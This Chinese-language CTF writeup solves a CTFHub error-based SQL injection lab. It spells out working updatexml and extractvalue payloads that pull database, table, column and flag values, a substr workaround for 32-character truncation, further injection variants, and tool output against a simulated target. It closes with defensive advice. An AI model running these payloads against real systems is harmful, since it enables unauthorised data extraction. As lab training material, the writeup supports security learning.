---
layout: post
title: CTFHub - SQL 报错注入 Writeup
platform: ctfhub
date: 2026-10-21 09:30:00 +0800
categories: CTF
---

CTFHub - SQL 报错注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 报错注入）
- 题型：Web
- 考点：**报错注入**（`updatexml` / `extractvalue`）、**32 字符截断**

```text
页面特征：
    · 输入 id=1 → 显示"查询正确"，但【不显示任何数据】
    · 页面回显拼好的 SQL：select * from news where id=1
    · 输入 id=1' → 页面显示 SQL 报错信息
```


```text
页面标题：CTFHub 技能学习 | 报错注入

id=1 的响应：
    <code>select * from news where id=1</code>
    查询正确                              ← ★ 只有"正确"，没有数据

id=1' 的响应（确认会回显报错）：
    <code>select * from news where id=1'</code>
    查询错误: You have an error in your SQL syntax;
              check the manual that corresponds to your MariaDB server version
              for the right syntax to use near ''' at line 1

① 爆库名
    1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
    → 查询错误: XPATH syntax error: '~sqli~'
    → 库名 = sqli

② 爆表名
    1 and updatexml(1,concat(0x7e,(select group_concat(table_name)
      from information_schema.tables where table_schema=database()),0x7e),1)
    → XPATH syntax error: '~flag,news~'

③ 爆字段名
    1 and updatexml(1,concat(0x7e,(select group_concat(column_name)
      from information_schema.columns where table_name='flag'),0x7e),1)
    → XPATH syntax error: '~flag~'
    （顺便：news 表字段是 id,data）

④ ★ 爆 flag —— 遇到 32 字符截断
    1 and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)
    → XPATH syntax error: '~ctfhub{a30f5e131724ff1a0fda2797
                                        └──────┬────────┘
                                   ★ 末尾的 } 被截掉了！

⑤ 用 substr 分段补齐
    substr(group_concat(flag),1,30)  → '~ctfhub{a30f5e131724ff1a0fda279~'
    substr(group_concat(flag),31,30) → '~7}~'

    拼接：ctfhub{a30f5e131724ff1a0fda279 + 7}
        = ctfhub{a30f5e131724ff1a0fda2797}

flag         : ctfhub{a30f5e131724ff1a0fda2797}
```

> 💡 **看第 ④ 步**：报错信息里 `~ctfhub{a30f5e131724ff1a0fda2797` 少了结尾的 `}` ——
> 因为 `~` + 31 个字符 = 32，正好卡在上限，最后那个 `}` 被切掉了。
> **这就是为什么必须会用 `substr()` 分段**。

二、题目分析

**① 为什么 UNION 注入用不了**

```text
UNION 注入的前提是：页面会把【查询结果】打印出来。

    0 union select 1,database()
    → 页面显示 Data: sqli      ← 有回显才能用

但这题页面只显示"查询成功"：
    → 查询结果不给看
    → UNION 注入就算成功，你也看不见结果 ❌
```

**② 报错注入的思路**

```text
既然"正常结果"看不到，那就想办法让数据库【报错】，
并且把要查的数据塞进错误信息里带出来。

    数据 → 塞进一个必定报错的函数 → 报错信息里就包含数据
                                      ↓
                              页面把报错打印出来
                                      ↓
                                  你读到了数据
```

**③ 两个经典函数**

**（1）`updatexml()`**

```sql
updatexml(xml_doc, xpath_expr, new_xml)
```

- 第 2 个参数必须是**合法的 XPath 表达式**
- 不是的话 → 报错，**并把那个非法值显示出来**

```sql
updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
                  └─┬─┘                        └─┬─┘
              0x7e 就是 ~                  用 ~ 包住，方便提取
              
页面报错：XPATH syntax error: '~sqli~'
                              └──┬──┘
                          数据带出来了 ✅
```

**为什么用 `0x7e`（`~`）包住**：

```
① 让 XPath 一定非法（~ 不是合法 XPath 起始字符）→ 必定报错
② 给我一个明确的边界 → 从响应里正则 ~(.*?)~ 就能精确捞出数据
③ 避免数据本身含有特殊字符导致提取混乱
```

**（2）`extractvalue()`**

```sql
extractvalue(xml_frag, xpath_expr)
```

同样的道理 —— 第 2 个参数非法就报错并显示它：

```sql
extractvalue(1, concat(0x7e, database()))
→ XPATH syntax error: '~sqli~'
```

**④ ★ 最大的坑：32 字符截断**

```text
updatexml / extractvalue 的报错信息【最多显示 32 个字符】

所以查长数据（比如 flag、多个表名）会被截断：

    updatexml(1,concat(0x7e,(select group_concat(table_name) from ...),0x7e),1)
    → XPATH syntax error: '~flag,news~'              ← 短，能看全

    updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)
    → XPATH syntax error: '~ctfhub{a30f5e131724ff1a0fda2797'  ← ★ 被切断了！
```

**解决办法：用 `substr()` 分段取**

```sql
-- 第 1 段：字符 1~30
substr((select group_concat(flag) from flag), 1, 30)

-- 第 2 段：字符 31~60
substr((select group_concat(flag) from flag), 31, 30)

-- 拼起来就是完整的
```

**也可以用 `right()` 取末尾**：

```sql
right((select group_concat(flag) from flag), 31)   -- 取最右边 31 个字符
```

> 💡 **为什么是 30 而不是 32**：`~` 和 `~` 各占 1 个字符，所以要留出空间。
> 报错信息是 `XPATH syntax error: '~数据~'`，`~...~` 这部分最多 32。

三、解题步骤

**第 1 步：确认注入类型**

```
ID 框输入：1
→ 显示：查询成功
→ SQL 回显：select * from news where id=1
                            └┬┘
                      没有引号 → 数值型
```

**第 2 步：确认页面会回显报错**

```
ID 框输入：1'
→ SQL 变成：select * from news where id=1'
→ 页面显示 SQL 报错信息 ✅
```

**这一步是关键判断**：
```
· 有报错 → 可以用报错注入
· 没报错（只显示"查询失败"） → 只能走盲注
```

**第 3 步：爆库名**

```
ID 框输入：
1 and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
```

**页面报错**：

```
XPATH syntax error: '~sqli~'
```

→ 库名 = `sqli`

**第 4 步：爆表名**

```
ID 框输入：
1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
```

**页面报错**：

```
XPATH syntax error: '~flag,news~'
```

→ 表名 = `flag`、`news`

**第 5 步：爆字段名**

```
ID 框输入：
1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)
```

**页面报错**：

```
XPATH syntax error: '~flag~'
```

→ 字段名 = `flag`

**第 6 步：爆 flag（★ 注意截断）**

```
ID 框输入：
1 and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)
```

**页面报错**：

```
XPATH syntax error: '~ctfhub{a30f5e131724ff1a0fda2797'
                              └──────┬───────┘
                          ★ 被截断了！只有 32 个字符
```

**第 7 步：用 `substr` 分段取完整 flag**

**第 1 段**（字符 1~30）：

```
1 and updatexml(1,concat(0x7e,(select substr(group_concat(flag),1,30) from flag),0x7e),1)
```

**第 2 段**（字符 31~60）：

```
1 and updatexml(1,concat(0x7e,(select substr(group_concat(flag),31,30) from flag),0x7e),1)
```

**把两段拼起来**：

```
第 1 段: ctfhub{a30f5e131724ff1a0fda279
第 2 段: 7}
         └──────────────────────────┘
拼接后: ctfhub{a30f5e131724ff1a0fda2797}      ← 完整 flag
```

**第 8 步：提交 flag → 通关**

---

**用工具一键跑（我写的脚本，自动处理截断）**

```text
双击 sqli-error.bat
→ 粘贴地址：http://challenge-xxx:10800/?id=1
→ 是否字符型：本题 N
→ 用哪个函数：直接回车（默认 updatexml）
```

**工具实测输出**（我用 Python 模拟了一个 32 字符截断的报错注入靶场来验证）：

```text
① 确认页面会显示 SQL 报错信息
  页面: SQL error injection demo select * from news where id=1 查询成功
  是否出现报错关键字: True

② 测试报错注入点
  payload: id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
  响应  : XPATH syntax error: '~sqli~'
  ★ 提取到的值: 'sqli'

③ 爆表名（★ 会自动处理 32 字符截断）
     第 1 段: 'flag,news'
  ★ 表名: 'flag,news'

④ 爆字段名
     第 1 段: 'flag'
  表 flag  字段: ['flag']
     第 1 段: 'id,data'
  表 news  字段: ['id', 'data']

⑤ 爆数据，找 flag
     第 1 段: 'ctfhub{demo_error_based_inje'      ← 被截断
     第 29 段: 'ction_88}'                        ← ★ 自动取第二段
  flag.flag -> 'ctfhub{demo_error_based_injection_88}'

★ FLAG: ctfhub{demo_error_based_injection_88}
```

> 💡 **注意第 ⑤ 步分了两次** —— 工具自动用 `substr()` 把长数据切成多段取回来再拼接。
> 这是报错注入必须处理的问题。

四、延伸知识

**① 报错注入 vs UNION 注入**

| | UNION 注入 | 报错注入 |
|---|---|---|
| **前提** | 页面显示查询结果 | 页面显示 SQL 报错 |
| **原理** | 把数据拼进结果集 | 把数据拼进错误信息 |
| **长度限制** | 无（但页面可能显示不全）| **32 字符** |
| **函数** | `union select` | `updatexml` / `extractvalue` / `floor` |
| **效率** | 高（一次拿全部）| 中（长数据要分段）|

**判断顺序**：

```
① 先试 UNION（0 union select 1,2）
     → 有回显 → 用 UNION（最快）

② UNION 无回显，但页面显示报错
     → 用报错注入

③ 既无回显也无报错
     → 只能盲注（布尔/时间）
```

**② 其他的报错注入函数（了解）**

**（1）`floor()` + `rand()` 组合（最经典）**

```sql
1 and (select 1 from (select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)
```

**原理**：`group by` 时 `rand()` 生成重复的键 → 主键冲突报错 → 把数据带出来

**优点**：不限 32 字符
**缺点**：语句长、不稳定（每次结果可能不同）

**（2）`exp()` 溢出**

```sql
1 and exp(~(select * from (select database())a))
```

利用数值溢出报错，但可用性差。

**（3）`geometrycollection()`**

```sql
1 and geometrycollection((select * from(select database())a))
```

**③ CTFHub 报错注入这题的信息结构**

```text
库   : sqli
表   : flag、news
字段 : flag 表只有 flag 一个字段
      news 表有 id、data
```

**④ 防护**

```text
· ★ 参数化查询（根本办法）
· 关闭错误回显（display_errors = Off）—— 这是报错注入的命门
      PHP: ini_set('display_errors', 0);
      MySQL: 不要把 mysql_error() 输出到页面
· 统一错误提示：只显示"查询失败"，不显示具体原因
· 输入校验：id 必须是纯数字 → intval()
· 最小权限数据库账号
```

五、总结

- **本题核心：页面不回显数据但回显报错 → 用 `updatexml`/`extractvalue` 把数据塞进报错信息里带出来。**
- 完整 payload 模板：

```sql
-- 爆库名
1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)

-- 爆表名
1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)

-- 爆字段名
1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)

-- 爆数据（会被 32 字符截断）
1 and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)

-- ★ 分段取（解决截断）
1 and updatexml(1,concat(0x7e,(select substr(group_concat(flag),1,30) from flag),0x7e),1)
1 and updatexml(1,concat(0x7e,(select substr(group_concat(flag),31,30) from flag),0x7e),1)
```

- **两个必记要点**：

```text
① 用 0x7e（~）包住数据 —— 既保证报错，又方便正则提取
② ★ 报错信息最多 32 字符 —— 长数据必须用 substr() 分段
```

- **三种 SQL 注入的判断顺序**：

```text
有回显   → UNION 注入（最简单）
有报错   → 报错注入（本题）
都没有   → 盲注（布尔 / 时间）
```
